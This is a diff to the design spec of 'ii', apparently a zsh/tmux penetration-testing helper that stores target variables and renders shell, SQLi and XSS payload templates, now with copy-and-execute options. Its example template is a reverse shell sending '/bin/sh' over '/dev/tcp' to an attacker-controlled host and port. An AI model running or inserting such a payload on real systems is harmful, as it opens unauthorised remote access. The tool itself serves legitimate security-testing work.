@@ -98,10 +98,19 @@ ii help
 
 ```text
 ii s
+ii sr
+ii g
 ii l
 ii i
 ii ls
+ii voc
 ii p
+ii pc
+ii pe
+ii pce
+ii pic
+ii pice
+ii u
 ii h
 ```
 
@@ -109,10 +118,19 @@ Final naming decision:
 
 ```text
 ii s = ii set
+ii sr VALUE = ii set rhost=VALUE
+ii g = ii get
 ii l = ii load
 ii i = ii interactive
 ii ls = variable list
+ii voc [PATH] = ii v --out [PATH]
 ii p = ii payload
+ii pc KEYWORD [...] = ii payload --copy KEYWORD [...]
+ii pe [KEYWORD ...] = ii payload --execute [KEYWORD ...]
+ii pce [KEYWORD ...] = ii payload --copy --execute [KEYWORD ...]
+ii pic = ii payload --input --copy
+ii pice = ii payload --input --copy --execute
+ii u = ii unset
 ii h = ii help
 ```
 
@@ -128,44 +146,14 @@ Short form:
 ii s NAME=VALUE
 ii s:NAME=VALUE[,NAME=VALUE...]
 ii s:NAME[,NAME...] --from-shell
+ii s --from-shell -a
 ```
 
-With no arguments:
+`ii set` is CLI-only. With no arguments or with a name but no value, it prints
+usage and returns status 2. Interactive variable management belongs to `ii i`.
 
-```text
-ii s
-```
-
-opens a TUI for common variables:
-
-```text
-DOMAIN
-LHOST
-RHOST
-LPORT
-RPORT
-USERT
-PASST
-USER1
-PASS1
-USER2
-PASS2
-```
-
-With one filter argument, match variable names before prompting for a value. No
-matches prints `no matched`; one match goes straight to the value prompt;
-multiple matches open a selection prompt. Single-letter shortcuts include `r`
-for `RHOST`, `l` for `LHOST`, and `d` for `DOMAIN`:
-
-```zsh
-ii s r
-ii s:r
-ii s:l
-ii s:d
-```
-
-Direct value setting always uses `=`. Multiple assignments can be separate
-arguments or comma-separated shortcut entries:
+One variable can use `NAME VALUE` or `NAME=VALUE`. Multiple assignments use
+separate `NAME=VALUE` arguments or comma-separated shortcut entries:
 
 ```zsh
 ii s usert=alice
@@ -179,6 +167,15 @@ variables:
 
 ```zsh
 ii s:usert,passt --from-shell
+```
+
+`ii s --from-shell -a` checks only the default variable names, prefers a
+non-empty lowercase shell value over uppercase, saves and prints every match,
+and silently skips unset or empty defaults. The default list is:
+
+```text
+domain lhost rhost lport rport user1 pass1 user2 pass2 user3 pass3 user4 pass4
+user5 pass5 cuser cpass tuser tpass directs
 ```
 
 `-d` means detect. It is only supported for `LHOST` and detects the IPv4 address
@@ -279,7 +276,9 @@ Behavior:
 
 ```text
 1. Read configured ii_ variables from tmux.
-2. Merge them with default variable names.
+2. Merge them with the default names domain, lhost, rhost, lport, rport,
+   user1 through user5, pass1 through pass5, cuser, cpass, tuser, tpass, and
+   directs.
 3. Present names in fzf with populated variables before empty default names.
 4. Show each name with a single-line value preview.
 5. Show the selected variable value in a compact bottom preview pane.
@@ -311,7 +310,8 @@ Behavior:
 2. Skip empty values.
 3. If PATTERN is omitted, print every non-empty variable.
 4. If PATTERN is present, filter by key name only, case-insensitively.
-5. Print each match as key line, value line, blank line.
+5. Print each match as a lowercase key line followed by its value, without blank
+   separator lines.
 6. Do not open fzf.
 7. Do not filter values.
 ```
@@ -329,16 +329,13 @@ ii ls d
 Expected output:
 
 ```text
-LHOST
+lhost
 192.168.45.192
-
-RHOST
+rhost
 192.168.201.175
-
-LPORT
+lport
 443
-
-RPORT
+rport
 80
 ```
 
@@ -348,6 +345,29 @@ Expected fallback filtering:
 ii ls port   matches LPORT and RPORT
 ii ls 443    does not match lport=443 unless the variable name contains 443
 ```
+
+### `ii v --out [PATH]`
+
+Alias:
+
+```text
+ii voc [PATH]
+```
+
+Behavior:
+
+```text
+1. Read all ii_ variables from the current tmux session.
+2. Skip empty values.
+3. Remove the internal ii_ prefix and write lowercase shell names.
+4. Quote every value with shell-safe single-quote escaping.
+5. Write to PATH, defaulting to .env in the current directory.
+6. Atomically replace an existing output file.
+7. Print the number of written variables and the absolute output path.
+```
+
+The generated file can be loaded with `source ./.env`. `ii v` without `--out`
+retains its existing alias behavior for `ii ls`.
 
 ### `ii payload [CATEGORY]`
 
@@ -368,20 +388,29 @@ Behavior:
    paths only. Preview renderable tokens with values in green and missing
    renderable tokens in red without changing render output.
 5. Resolve the selected entry to a payload file.
-6. Render the template with fresh tmux II_ values.
-   Missing or empty values render as lowercase shell fallbacks like $rhost.
+6. Render with a non-empty lowercase shell value first, then a fresh matching
+   tmux `ii_` value, preserving missing tokens.
 7. Print the rendered payload.
 8. Print variables used by the selected payload.
-10. Display description as an independent preview block and controls/status at
+9. Display description as an independent preview block and controls/status at
     the bottom of the preview. Reserve the description block when space allows,
     but preserve controls/status first.
-11. Let l unfold the selected script into a full preview. In unfolded mode,
-    hide and disable filtering while preserving j/k selection movement, y copy,
-    Enter render/output, and q abort. Let h return to the
-    searchable selector.
-12. `ii p --www --file PATH` reads PATH, renders it with the payload renderer,
+10. Let l unfold the selected script into a full preview. In unfolded mode,
+    hide and disable filtering while preserving j/k selection movement, y
+    copy-and-quit, Enter render/output, and q abort. Let h return to the
+    searchable selector. In compact normal mode, e executes the selected
+    rendered payload in the current shell.
+11. `ii p --www --file PATH` reads PATH, renders it with the payload renderer,
     prints the render report and rendered output, and symlinks PATH under
     /www/p without overwriting existing targets.
+12. Multiple positional arguments are joined with spaces and passed to fzf as
+    the initial query. A single established category retains category filtering.
+13. `--execute` makes Enter confirm and execute in the current shell; `pe` is
+    the fixed alias. Adding `--copy`, or using `pce`, copies after confirmation
+    and before execution. Execution is not isolated, so shell side effects
+    persist.
+14. `--copy` and `pc` skip the selector, use all keywords as one
+    non-interactive fzf query, and copy the highest-ranked rendered match.
 ```
 
 Categories:
@@ -396,9 +425,10 @@ sqli     sqli/*
 xss      xss/*
 ```
 
-`script/*` is for custom script snippets. Files can use `${II_NAME}`
-placeholders, or literal shell variables such as `$rhost`. If no renderable
-placeholder is present, the selected script text is copied literally.
+`script/*` is for custom script snippets. New files use lowercase placeholders
+such as `%rhost%`, `$rhost`, `${lhost}`, and `${file:t}`. Uppercase and legacy
+`II_NAME` forms remain literal. If no
+renderable placeholder is present, the selected script text is copied literally.
 
 Payload files may start with a metadata line:
 
@@ -424,16 +454,6 @@ ii p linux
 ii p windows
 ii p sqli
 ii p xss
-```
-
-Future interactive switch support may use fzf keybinds:
-
-```text
-ctrl-a  switch to all
-ctrl-s  switch to shell
-ctrl-l  switch to linux
-ctrl-w  switch to windows
-ctrl-q  quit
 ```
 
 ### `ii unset NAME [...]`
@@ -475,8 +495,10 @@ Each command owns its help text so new behavior is documented near the command.
 Default path:
 
 ```text
-~/.config/ii/payloads/
+${II_PLUGIN_DIR}/payloads/
 ```
+
+Set `II_PAYLOAD_DIR` only to use an external payload library.
 
 Recommended layout:
 
@@ -519,25 +541,27 @@ Payload templates are plain text files.
 Preferred placeholder form:
 
 ```text
-${II_LHOST}
-${II_LPORT}
-${II_DOMAIN}
+$lhost
+${lport}
+${domain}
 ```
 
 Example:
 
 ```text
-/bin/sh -i >/dev/tcp/${II_LHOST}/${II_LPORT} 2>&1 0>&1
+/bin/sh -i >/dev/tcp/${lhost}/${lport} 2>&1 0>&1
 ```
 
 ## Payload Render Layer
 
-Render must be isolated from current shell state.
+Payload rendering reads current command shell overrides without requiring the
+pane to run `ii l`, then falls back to fresh tmux session state.
 
 Input:
 
 ```text
-selected payload file
+selected payload file or pasted input text
+current lowercase shell variables
 current tmux session ii_ variables
 ```
 
@@ -551,14 +575,16 @@ used variable report
 Required behavior:
 
 ```text
-1. Read the selected payload file as plain text.
+1. Read the selected payload file or pasted input as plain text.
    A first-line `# description:` metadata line is not part of the render body.
-2. Read tmux session environment at render time.
-3. Replace `${II_NAME}` placeholders with tmux values.
-4. Support bare `II_NAME` replacement for compatibility.
-5. Render missing or empty tmux values as lowercase shell fallbacks like `$rhost`.
-6. Report every variable required by the template, using shell fallback text for
-   missing or empty values.
+2. Recognize lowercase `%name%`, `$name`, `${name}`, and `${name:t}`
+   placeholders. Leave uppercase and legacy `II_NAME` forms unchanged.
+3. Use a non-empty lowercase shell variable from the current command first.
+4. Otherwise read the matching tmux `ii_name` value at render time.
+5. Preserve the original token when both sources are missing or empty.
+6. Leave uppercase shell variables and PowerShell scope variables unchanged.
+7. Report shell, tmux, and missing render sources without changing rendered
+   output.
 ```
 
 Important test case:
@@ -755,14 +781,18 @@ Layer files:
 
 ```text
 lib/tmux.zsh        tmux and external command checks
+lib/help_registry.zsh shared help topic registration and longest-path routing
 lib/clipboard.zsh   copy backend detection and copy
 lib/fzf.zsh         shared fzf input and preview helpers
 lib/var_helpers.zsh variable helpers and candidate generation
 lib/var_interactive.zsh interactive variable selection, add, and edit flows
 lib/vars.zsh        variable command entrypoints
+lib/var_output.zsh  v routing and shell-sourceable variable file output
 lib/www.zsh         /www tree, search, and symlink helpers
 lib/payloads.zsh    payload list, fuzzy selection, render, reports
-lib/help.zsh        help routing
+lib/payload_input.zsh pasted input command, stream protocol, and ZLE editor
+lib/payload_command.zsh public payload routing facade and aggregate help
+lib/help.zsh        top-level help summary and help-topic registration
 lib/version.zsh     version command
 lib/core.zsh        dispatcher and command functions
 ```
@@ -771,16 +801,22 @@ Load order:
 
 ```text
 1. tmux.zsh
-2. clipboard.zsh
-3. fzf.zsh
-4. var_helpers.zsh
-5. var_interactive.zsh
-6. vars.zsh
-7. www.zsh
-8. payloads.zsh
-9. help.zsh
-10. version.zsh
-11. core.zsh
+2. help_registry.zsh
+3. tmux_integration.zsh
+4. clipboard.zsh
+5. fzf.zsh
+6. interact.zsh
+7. var_helpers.zsh
+8. var_interactive.zsh
+9. vars.zsh
+10. var_output.zsh
+11. payloads.zsh
+12. payload_input.zsh
+13. www.zsh
+14. payload_command.zsh
+15. help.zsh
+16. version.zsh
+17. core.zsh
 ```
 
 ## Deployment Package
@@ -792,6 +828,7 @@ export/ii/
   ii.plugin.zsh
   lib/
   payloads/
+  script/ii-tmux-pice
   README.md
 ```
 
@@ -801,25 +838,37 @@ should copy `export/ii` as one unit.
 ## Help Audit Script
 
 `script/help` is a development helper for comparing registered command help
-against this spec. It sources the local `ii.plugin.zsh` and prints:
+against this spec. Each command layer registers its canonical topic and handler
+beside the implementation. The script sources `ii.plugin.zsh` and prints all
+canonical topics below; topic order follows feature-layer load order:
+
+Live help uses three separate sections: executable forms belong in `usage`, true
+alternative names belong in `Aliases`, and representative lookup routes belong
+in `Help`. Full conventions and maintainer workflow are defined in
+`doc/help.md`.
 
 ```text
 ii help
 ii help set
+ii help get
+ii help clip
 ii help load
+ii help sync
 ii help interactive
 ii help ls
 ii help payload
 ii help payload-input
 ii help payload-www
 ii help payload-www-file
+ii help payload-www-ln
+ii help payload-www-ls
+ii help payload-www-search
 ii help unset
 ii help version
 ```
 
-The script must call the registered help implementations instead of duplicating
+The script must call the listed help implementations instead of duplicating
 help text. It is not part of the deployable `export/ii` package.
-```
 
 ## Implementation Status
 
@@ -829,12 +878,19 @@ Implemented:
 - plugin entrypoint: ii.plugin.zsh
 - plugin-provided default II_PLUGIN_DIR, II_PAYLOAD_DIR, and II_WWW_ROOT
 - layered lib/ structure
-- ii dispatcher with short subcommands: s, l, i, v, p, h
+- ii dispatcher with short subcommands: s, sr, g, l, i, v, voc, p, pc, pe, pce, pic, pice, u, h
 - tmux session variable source of truth
 - argument-based payload filtering
 - fzf payload and variable selection
 - nano-style bottom preview keys and copy status
+- compact borderless selector footers with complete-unit wrapping
+- payload multi-keyword initial queries and current-shell execution through e,
+  --execute, pe, and copy-before-execute pce
 - interactive variable edit, add, and copy flows
+- interactive payload input with Enter submit, Ctrl-J newline, and a persistent
+  bottom key hint
+- input-copy-execute through `ii pice`, plus the tmux popup-only `ii pice`
+  dispatcher path for sending confirmed payloads to the originating pane
 - fresh tmux-based payload rendering
 - payload description metadata
 - deterministic non-interactive fzf filter behavior
@@ -842,7 +898,7 @@ Implemented:
 - default OSC52 backend for tmux/SSH clipboard copy
 - `ii s:lhost -d [INTERFACE]` interface IPv4 detection
 - generated `export/ii` deployment package through `script/make`
-- `script/help` registered-help audit script
+- thin per-feature help registry and `script/help` audit script
 ```
 
 Not implemented yet:
